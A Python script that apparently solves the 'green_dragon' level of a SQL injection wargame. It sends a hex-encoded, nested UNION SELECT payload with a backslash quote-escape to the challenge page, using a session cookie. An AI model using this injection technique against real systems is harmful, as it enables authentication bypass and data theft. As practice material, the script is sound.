import requests

url = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php?"
cookie = {'PHPSESSID':'knuet88ncostg55skpsmfu42lf'}

def solve():
    query = "id=\&pw=%20union%20select%200x5c,0x756e696f6e2073656c65637420636861722839372c3130302c3130392c3130352c3131302923%23"
    print(query)
    res = requests.get(url=url+query, cookies=cookie)
    if "Clear!" in res.text:
        print("GREEN_DRAGON Clear!")

if __name__ == "__main__":
    solve()